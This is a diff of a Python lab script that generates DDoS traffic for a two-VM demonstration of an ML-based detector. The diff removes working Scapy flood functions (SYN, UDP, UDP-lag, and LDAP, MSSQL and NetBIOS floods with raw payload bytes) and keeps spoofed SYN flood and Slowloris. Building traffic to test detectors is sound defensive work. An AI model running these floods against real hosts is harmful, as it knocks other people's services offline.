@@ -2,33 +2,26 @@
 """
 ddos_traffic_generator.py - Traffic generator for 2-VM DDoS detection demo.
 
-Generates different types of network traffic for testing the ML-based
-DDoS detection system. Covers the 6 attack categories in the CICDDoS2019
-dataset plus benign traffic, and additional scenarios (SYN Flood with
-IP spoofing, Slowloris). Designed to run on the ATTACKER VM targeting
-the VICTIM VM where live_ips.py is running.
+Generates attack traffic for 2 demo scenarios plus benign baseline, designed
+to run on the ATTACKER VM targeting the VICTIM VM where live_ips.py is running.
+
+  - Kịch bản A: SYN Flood + IP Spoofing (Layer 4) — tràn state table
+  - Kịch bản B: Slowloris (Layer 7) — vắt kiệt connection pool web server
 
 This script is intended for CONTROLLED LAB ENVIRONMENTS ONLY.
 Only use it between VMs on an isolated virtual network.
 
 Usage:
-    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_flood
-    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_spoof -d 30
-    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack slowloris -d 60
-    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all --duration 30
+    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack syn_spoof -d 60
+    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack slowloris -d 120
+    sudo python3 tools/ddos_traffic_generator.py --target <VICTIM_IP> --attack all -d 90
     sudo python3 tools/ddos_traffic_generator.py --list
 
 Attack types (Kịch bản):
-    benign        - Normal HTTP/ICMP traffic
-    syn_flood     - TCP SYN Flood (Layer 4)
-    syn_spoof     - TCP SYN Flood with IP Spoofing (--rand-source style)
-    udp_flood     - UDP Flood
-    udp_lag       - UDP-Lag Flood (large payloads)
-    ldap_flood    - LDAP amplification-style traffic
-    mssql_flood   - MSSQL amplification-style traffic
-    netbios_flood - NetBIOS amplification-style traffic
-    slowloris     - Slowloris (Layer 7) — hold HTTP connections open
-    all           - Run all attacks sequentially
+    benign    - Lưu lượng bình thường (HTTP, ICMP, DNS)
+    syn_spoof - SYN Flood + IP Spoofing (Layer 4, như hping3 --rand-source)
+    slowloris - Slowloris (Layer 7) — giữ kết nối HTTP mở lâu
+    all       - Chạy tuần tự: benign → syn_spoof → slowloris
 
 Requirements:
     pip install scapy
@@ -67,15 +60,9 @@ except ImportError:
 
 
 ATTACK_DESCRIPTIONS = {
-    "benign": "Normal HTTP GET/ICMP ping traffic",
-    "syn_flood": "TCP SYN Flood (Layer 4) — mass SYN packets from real IP",
-    "syn_spoof": "TCP SYN Flood + IP Spoofing (Layer 4) — random source IPs (like hping3 --rand-source)",
-    "udp_flood": "UDP Flood — high-rate small UDP packets to saturate bandwidth",
-    "udp_lag": "UDP-Lag Flood — large UDP payloads causing processing delay",
-    "ldap_flood": "LDAP amplification-style — UDP port 389 with LDAP-like payloads",
-    "mssql_flood": "MSSQL amplification-style — UDP port 1434 with MSSQL-like payloads",
-    "netbios_flood": "NetBIOS amplification-style — UDP port 137 with NetBIOS-like payloads",
-    "slowloris": "Slowloris (Layer 7) — hold HTTP connections open to exhaust server threads",
+    "benign": "Lưu lượng bình thường (HTTP GET, ICMP ping, DNS query)",
+    "syn_spoof": "SYN Flood + IP Spoofing (Layer 4) — IP nguồn giả mạo, tràn state table",
+    "slowloris": "Slowloris (Layer 7) — giữ kết nối HTTP mở, vắt kiệt connection pool",
 }
 
 
@@ -85,8 +72,12 @@ def _check_root() -> None:
         sys.exit(1)
 
 
+# ---------------------------------------------------------------------------
+# Benign baseline
+# ---------------------------------------------------------------------------
+
 def generate_benign(target: str, duration: float, pps: int) -> None:
-    """Generate normal HTTP and ICMP traffic."""
+    """Generate normal HTTP, ICMP, and DNS traffic."""
     logger.info(f"Generating benign traffic to {target} for {duration}s")
     end_time = time.time() + duration
     count = 0
@@ -120,26 +111,9 @@ def generate_benign(target: str, duration: float, pps: int) -> None:
     logger.info(f"Benign traffic done: {count} packets sent")
 
 
-def generate_syn_flood(target: str, duration: float, pps: int) -> None:
-    """TCP SYN Flood (Layer 4) — send SYN packets with random source ports."""
-    logger.info(f"SYN Flood to {target}:{80} for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / TCP(
-            sport=RandShort(),
-            dport=80,
-            flags="S",
-            seq=random.randint(0, 2**32 - 1),
-        )
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"SYN Flood done: {count} packets sent")
-
+# ---------------------------------------------------------------------------
+# Kịch bản A — SYN Flood + IP Spoofing (Layer 4)
+# ---------------------------------------------------------------------------
 
 def _random_ip() -> str:
     """Generate a random non-reserved IP address for spoofing."""
@@ -180,128 +154,9 @@ def generate_syn_spoof(target: str, duration: float, pps: int) -> None:
     logger.info(f"SYN Flood + IP Spoofing done: {count} packets sent")
 
 
-def generate_udp_flood(target: str, duration: float, pps: int) -> None:
-    """UDP Flood — high-rate small UDP packets."""
-    logger.info(f"UDP Flood to {target} for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-    payload = os.urandom(64)
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=random.randint(1, 65535),
-        ) / Raw(load=payload)
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"UDP Flood done: {count} packets sent")
-
-
-def generate_udp_lag(target: str, duration: float, pps: int) -> None:
-    """UDP-Lag Flood — large UDP payloads causing processing delay."""
-    logger.info(f"UDP-Lag Flood to {target} for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-    payload = os.urandom(1400)
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=random.randint(1, 65535),
-        ) / Raw(load=payload)
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"UDP-Lag Flood done: {count} packets sent")
-
-
-def generate_ldap_flood(target: str, duration: float, pps: int) -> None:
-    """LDAP amplification-style — UDP port 389."""
-    logger.info(f"LDAP Flood to {target}:389 for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-    # LDAP search request pattern (simplified)
-    ldap_payload = (
-        b"\x30\x84\x00\x00\x00\x2d"
-        b"\x02\x01\x01"
-        b"\x63\x84\x00\x00\x00\x24"
-        b"\x04\x00"
-        b"\x0a\x01\x02"
-        b"\x0a\x01\x00"
-        b"\x02\x01\x00"
-        b"\x02\x01\x00"
-        b"\x01\x01\x00"
-        b"\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73"
-        b"\x30\x00"
-    )
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=389,
-        ) / Raw(load=ldap_payload)
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"LDAP Flood done: {count} packets sent")
-
-
-def generate_mssql_flood(target: str, duration: float, pps: int) -> None:
-    """MSSQL amplification-style — UDP port 1434."""
-    logger.info(f"MSSQL Flood to {target}:1434 for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-    # MSSQL Browser service probe
-    mssql_payload = b"\x02" + os.urandom(100)
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=1434,
-        ) / Raw(load=mssql_payload)
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"MSSQL Flood done: {count} packets sent")
-
-
-def generate_netbios_flood(target: str, duration: float, pps: int) -> None:
-    """NetBIOS amplification-style — UDP port 137."""
-    logger.info(f"NetBIOS Flood to {target}:137 for {duration}s at ~{pps} pps")
-    end_time = time.time() + duration
-    count = 0
-    delay = 1.0 / max(pps, 1)
-    # NetBIOS Name Service query pattern
-    netbios_payload = (
-        b"\x80\x94\x00\x00\x00\x01\x00\x00"
-        b"\x00\x00\x00\x00"
-        b"\x20\x43\x4b\x41\x41\x41\x41\x41"
-        b"\x41\x41\x41\x41\x41\x41\x41\x41"
-        b"\x41\x41\x41\x41\x41\x41\x41\x41"
-        b"\x41\x41\x41\x41\x41\x41\x41\x41"
-        b"\x41\x00\x00\x21\x00\x01"
-    )
-
-    while time.time() < end_time:
-        pkt = IP(dst=target) / UDP(
-            sport=RandShort(),
-            dport=137,
-        ) / Raw(load=netbios_payload)
-        send(pkt, verbose=False)
-        count += 1
-        time.sleep(delay)
-
-    logger.info(f"NetBIOS Flood done: {count} packets sent")
-
+# ---------------------------------------------------------------------------
+# Kịch bản B — Slowloris (Layer 7)
+# ---------------------------------------------------------------------------
 
 def generate_slowloris(target: str, duration: float, pps: int) -> None:
     """Slowloris (Layer 7) — hold HTTP connections open.
@@ -384,27 +239,24 @@ def generate_slowloris(target: str, duration: float, pps: int) -> None:
     )
 
 
+# ---------------------------------------------------------------------------
+# Attack registry & runner
+# ---------------------------------------------------------------------------
+
 ATTACK_GENERATORS = {
     "benign": generate_benign,
-    "syn_flood": generate_syn_flood,
     "syn_spoof": generate_syn_spoof,
-    "udp_flood": generate_udp_flood,
-    "udp_lag": generate_udp_lag,
-    "ldap_flood": generate_ldap_flood,
-    "mssql_flood": generate_mssql_flood,
-    "netbios_flood": generate_netbios_flood,
     "slowloris": generate_slowloris,
 }
 
 
 def run_all_attacks(target: str, duration: float, pps: int) -> None:
-    """Run all attack types sequentially with benign traffic between them."""
-    attacks = ["benign", "syn_flood", "syn_spoof", "udp_flood", "udp_lag",
-               "ldap_flood", "mssql_flood", "netbios_flood", "slowloris"]
+    """Run benign → syn_spoof → slowloris sequentially."""
+    attacks = ["benign", "syn_spoof", "slowloris"]
 
     per_attack_duration = duration / len(attacks)
     logger.info(
-        f"Running all {len(attacks)} attack types, "
+        f"Running {len(attacks)} phases, "
         f"{per_attack_duration:.0f}s each, total {duration:.0f}s"
     )
 
@@ -429,8 +281,9 @@ def main() -> None:
             "Only use between VMs on an isolated virtual network.\n"
             "Unauthorized use against real networks is illegal.\n\n"
             "Examples:\n"
-            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_flood\n"
-            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 60\n"
+            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack syn_spoof -d 60\n"
+            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack slowloris -d 120\n"
+            "  sudo python3 tools/ddos_traffic_generator.py --target 192.168.56.102 --attack all -d 90\n"
             "  sudo python3 tools/ddos_traffic_generator.py --list\n"
         ),
     )
@@ -452,7 +305,7 @@ def main() -> None:
         print("\nAvailable attack types:\n")
         for name, desc in ATTACK_DESCRIPTIONS.items():
             print(f"  {name:16s} {desc}")
-        print(f"\n  {'all':16s} Run all attacks sequentially\n")
+        print(f"\n  {'all':16s} Chạy tuần tự: benign → syn_spoof → slowloris\n")
         return
 
     if not args.target:
